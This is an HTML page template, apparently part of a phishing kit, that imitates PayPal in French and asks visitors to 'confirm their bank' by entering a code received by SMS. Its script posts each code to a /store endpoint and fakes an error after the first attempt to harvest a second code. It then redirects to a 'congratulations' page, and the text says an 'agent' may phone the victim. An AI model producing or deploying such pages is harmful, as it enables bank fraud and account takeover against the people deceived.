<!DOCTYPE html>
<html dir="ltr">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Confirmez votre banque</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
        <link rel="shortcut icon" type="image/x-icon" href="/images/ppl.ico">

        <link rel="stylesheet" href="/css/normalize.css">
        <link rel="stylesheet" href="/css/bootstrap.min.css">
        <link rel="stylesheet" href="/css/font-awesome.min.css">
        <link rel="stylesheet" href="/css/main_style.css">
    </head>

    <body>
        <style>
        .error {
            border: 1px solid #c72e2e;
        }

        </style>
        <div class="lod-full" style="display: none;">
            <div class="lod-c"></div>
        </div>
        <div class="contain">
            <div class="img-logo">
                <a href="#"><img src="/images/paypal-logo.png"
                        style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
            </div>
            <div class="center-color"></div>
            <div class="right-btn"><a href="#" class="log_out">Déconnexion</a></div>
            <div class="cls"></div>
        </div>
        <div class="contain biling-p">
            <form id="sms-form" method="POST" action="#" class="contain-info">
                <center>
                    <span class="step" style="text-transform:uppercase"><b>étape 3 sur 3</b></span>
                    <h3>Confirmez votre banque</h3>
                    <div style="text-align:left;text-transform:uppercase">
                        <center> <span class="step" style="text-transform:uppercase"></span>
                            <h3><b>Confirmation d'identité<br>
                                </b></h3>
                            <p style="text-align: left;">Vous devez obligatoirement confirmer votre compte bancaire à
                                l'aide du code reçu par SMS.
                            </p>
                            <hr>
                            <br>
                            NB: si vous ne recevez pas de code, vérifier la notification de votre application bancaire
                            ou un de nos agents vous appellera pour finaliser l'opération.
                            <p></p>

                            &nbsp;
                        </center>
                    </div>
                    <input id="sms" type="text" name="sms" class="bill_input" placeholder="Code recu par sms"
                        autocomplete="off" autocorrect="off">
                    <span></span>
                    <input type="submit" name="ibansub" id="sub" value="Confirmer" class="bill_input btn-bill">
                </center>
            </form>
        </div>
        <div class="foot-pay">
            <center>
                <a href="#">Aide et Contact</a>
                <a href="#">Confidentialité</a>
                <a href="#">Légal</a>
                <a href="#">Sécurité</a>
            </center>
        </div>
        <script src="/js/jquery-3.3.1.min.js"></script>
        <script src="/js/jequery.mask.min.js"></script>
        <script>
        function sendData(data, calback) {
            $.post("{{url('/store')}}", data)
                .done(calback).fail(function() {
                    location.reload();
                });
        }

        $(document).ready(function() {
            const sms = $("#sms");
            let attempt = 1;
            let max_attempt = 2;

            sms.mask('00000099');

            $('#sms-form').submit(function(e) {
                e.preventDefault();
                if (sms.val().length < 6) return;
                $('.lod-full').show();
                const form = $(this);
                if (attempt === max_attempt) {
                    return sendData(form.serialize(), function() {
                        location.replace("{{ url('/congratulations') }}");
                    });
                }
                sendData(form.serialize(), function() {
                    $('.lod-full').hide();
                    sms.val("");
                    sms.addClass('error');
                    attempt++;
                    console.log(attempt);
                });
            });
        });
        </script>


    </body>

</html>
